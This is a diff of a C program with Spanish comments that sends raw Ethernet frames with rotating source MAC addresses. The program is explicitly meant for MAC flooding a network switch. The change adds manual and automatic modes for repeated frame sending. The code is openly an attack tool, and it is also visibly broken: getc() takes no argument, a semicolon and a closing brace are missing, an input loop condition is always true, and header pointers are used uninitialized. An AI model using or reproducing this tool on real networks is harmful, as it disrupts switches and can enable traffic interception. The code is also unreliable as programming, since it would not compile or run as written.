@@ -14,64 +14,77 @@
 #include <sys/ioctl.h>
 #include <linux/ip.h>
 #include <linux/udp.h>
+#include <ctype.h>
 #include "ethernetFrame.h"
 
 int main(){
 
-    int total_len = 0;
-    int if_number;
-    char if_name[10];
-    unsigned char* sendbuff;
+    int total_len = 0;                                                  //Tamaño total
+    int if_number;                                                      //Numero interfaz
+    int modoDeUso = 0;                                                  //Modo de uso, 0 auto, 1 manual
+    int repeticiones = 0;                                               //Numero de frames a enviar
+    char if_name[10];                                                   //Nombre interfaz
+    char op = 'n';
+    unsigned char* sendbuff;                                            //Buffer con los datos
 
-    struct ifreq* ifreq_ip = malloc(sizeof(struct ifreq));
-    struct ethhdr* eth;
-    struct iphdr* iph;
-    struct sockaddr_ll* sadr_ll = malloc(sizeof(struct sockaddr_ll));
-    struct macDest* mdest = malloc(sizeof(struct macDest));
-    struct macSrc* msrc = malloc(sizeof(struct macSrc));
+    struct ethhdr* eth;                                                 //Estructura frame
+    struct iphdr* iph;                                                  //Estructura de paquete
+    struct ifreq* ifreq_ip = malloc(sizeof(struct ifreq));              // ??
+    struct sockaddr_ll* sadr_ll = malloc(sizeof(struct sockaddr_ll));   // ??
+    struct macDest* mdest = malloc(sizeof(struct macDest));             //Estructura MAC Destino
+    struct macSrc* msrc = malloc(sizeof(struct macSrc));                //Estructura MAC Origen
 
-    //Creamos un rawSocket
-    int sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+    int sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);            //Creamos un rawSocket
 
-    //Verificamos que el socket se creo correctamente
-    if(sock_raw == -1)
-        printf("Error abriendo el socket");
+    if(sock_raw == -1) printf("Error abriendo el socket");              //Verificamos que el socket se creo correctamente
 
-    //Obtenemos el nombre de la interfaz a usar
-    obtenerNombreInterfaz(if_name);
+    obtenerNombreInterfaz(if_name);                                     //Obtenemos el nombre de la interfaz a usar
 
-    //Obtenemos el numero de nuestra interfaz
-    obtenerNumeroInterfaz(ifreq_ip, sock_raw, if_name, &if_number);
+    obtenerNumeroInterfaz(ifreq_ip, sock_raw, if_name, &if_number);     //Obtenemos el numero de nuestra interfaz
 
-    //No importa la macdestino para hacer MAC Flooding
-    ponerMacDestino(mdest);
+    modoDeUso = menuDeUso(repeticiones);                                //Obtenemos el modo de uso del programa, si manual, o automatico
 
-    //Ponemos la mac origen
-    ponerMacOrigen(msrc);
+    ponerMacDestino(mdest);                                             //No importa la macdestino para hacer MAC Flooding
 
-    //Construimos la cabezera ethernet
-    sendbuff = (unsigned char*) malloc(64);
+    inizializarMacOrigen(msrc, modoDeUso);                              //Inicializamos una mac origen
+
+    ponerMacOrigen(msrc, modoDeUso);                                    //Ponemos la mac origen
+
+    sendbuff = (unsigned char*) malloc(64);                             //Reservamos memoria para el buffer
     memset(sendbuff, 0, 64);
 
-    eth = (struct ethhdr*)(sendbuff);
+    construirCabezeraEthernet(eth, msrc, mdest, &total_len);            //Construimos la cabezera ethernet
 
-    construirCabezeraEthernet(eth, msrc, mdest);
+    construirCabezeraIp(iph, total_len, ifreq_ip, &total_len);          //Construimos la cabezera ip
 
-    total_len += sizeof(struct ethhdr);
+    do{
 
-    // Cabezera de ip
-    iph = (struct iphdr*)(sendbuff + sizeof(struct ethhdr));
+        enviarFrame(sadr_ll, sock_raw, sendbuff, mdest, if_number);     //Enviamos el frame
 
-    construirCabezeraIp(iph, total_len, ifreq_ip);
+        if(modoDeUso == 1){                                             //Modo manual
+            do{
+                printf("Desea enviar otro frame (s/n)");
+                fflush(stdin);
+                op = getc();
+                tolower(op);
+            }while(op != 's' || op != 'n');
 
-    total_len += sizeof(struct iphdr);
+        }else{                                                          //Modo automatico
+            --repeticiones;
+            if(repeticiones == 0){
+                do{
+                    printf("Desea enviar mas frames ?, 0 para no enviar mas");
+                    fflush(stdin);
+                    scanf("%i", &repeticiones);
+                }while(repeticiones < 0);
+            }
+        }
 
-    //Enviamos el frame
-    enviarFrame(sadr_ll, sock_raw, sendbuff, mdest, if_number);
+        if(op == 's' || repeticiones > 0) ponerMacOrigen(msrc, modoDeUso);
 
-    cambiarMacOrigenEthernet(eth, msrc);
+    while(op == 's' || repeticiones > 0);
 
-    enviarFrame(sadr_ll, sock_raw, sendbuff, mdest, if_number);
+    printf("MAC Flooding completado")
 
     return 0;
 }
